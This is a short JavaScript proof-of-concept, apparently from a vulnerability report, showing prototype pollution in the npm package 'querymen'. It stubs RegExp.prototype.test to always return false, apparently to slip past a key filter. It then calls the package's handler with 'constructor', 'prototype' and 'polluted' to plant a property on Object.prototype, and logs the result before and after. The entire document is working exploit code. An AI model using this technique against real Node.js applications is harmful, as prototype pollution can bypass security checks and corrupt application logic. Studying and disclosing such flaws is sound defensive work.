RegExp.prototype.test = () => false;
var a = require('querymen');
obj = {};
console.log({}.polluted);
a.handler('constructor', 'prototype', 'polluted', 'yes');
console.log({}.polluted);